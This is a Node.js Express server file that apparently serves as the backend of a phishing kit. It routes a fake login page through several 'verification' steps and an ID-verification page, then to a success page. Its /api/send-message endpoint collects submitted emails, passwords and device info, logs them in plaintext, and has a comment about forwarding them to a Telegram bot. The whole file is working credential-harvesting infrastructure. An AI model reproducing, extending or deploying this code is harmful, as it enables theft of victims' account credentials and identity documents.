const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

console.log('Starting simple server...');
console.log('Current directory:', __dirname);
console.log('Environment:', process.env.NODE_ENV || 'development');

// Check if the index.html file exists
const indexPath = path.join(__dirname, 'index.html');
if (fs.existsSync(indexPath)) {
  console.log(`Index file exists at: ${indexPath}`);
} else {
  console.error(`ERROR: Index file NOT found at: ${indexPath}`);
}

// Set headers to allow cross-origin requests
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Parse JSON request bodies
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

// Log all requests
app.use((req, res, next) => {
  console.log(`Request: ${req.method} ${req.url}`);
  next();
});

// Serve static files from the root directory
app.use(express.static(__dirname));

// Health check endpoint for deployment platforms
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Root route - serve the login page
app.get('/', (req, res) => {
  console.log('Serving index.html');
  res.sendFile(indexPath);
});

// Verification step routes
app.get('/verify-step1', (req, res) => {
  console.log('Serving first verification page');
  res.sendFile(path.join(__dirname, 'verify-step1.html'));
});

app.get('/verify-step2', (req, res) => {
  console.log('Serving second verification page');
  res.sendFile(path.join(__dirname, 'verify-step2.html'));
});

app.get('/verify-step3', (req, res) => {
  console.log('Serving third verification page');
  res.sendFile(path.join(__dirname, 'verify-step3.html'));
});

app.get('/processing', (req, res) => {
  console.log('Serving processing page');
  res.sendFile(path.join(__dirname, 'processing.html'));
});

app.get('/verify-id', (req, res) => {
  console.log('Serving ID verification page');
  res.sendFile(path.join(__dirname, 'verify-id.html'));
});

app.get('/id-processing', (req, res) => {
  console.log('Serving ID processing page');
  res.sendFile(path.join(__dirname, 'id-processing.html'));
});

app.get('/success', (req, res) => {
  console.log('Serving success page');
  res.sendFile(path.join(__dirname, 'success.html'));
});

// API endpoint to receive form data
app.post('/api/send-message', (req, res) => {
  try {
    const { email, password, deviceInfo } = req.body;
    console.log('Login attempt received:');
    console.log('- Email/Username:', email);
    console.log('- Password:', password);
    if (deviceInfo) {
      console.log('- Device Info:', JSON.stringify(deviceInfo));
    }

    // You can implement Telegram notification here if needed
    // This would use the TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in send-message endpoint:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// Start the server
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Simple server running on http://0.0.0.0:${PORT}`);
  console.log(`Serving index.html directly from root directory`);
});

// Keep the server running and add some heartbeat logging
setInterval(() => {
  console.log("Server heartbeat - still running");
}, 30000);

// Handle graceful shutdown for container environments
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});

// Prevent the script from exiting due to errors
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});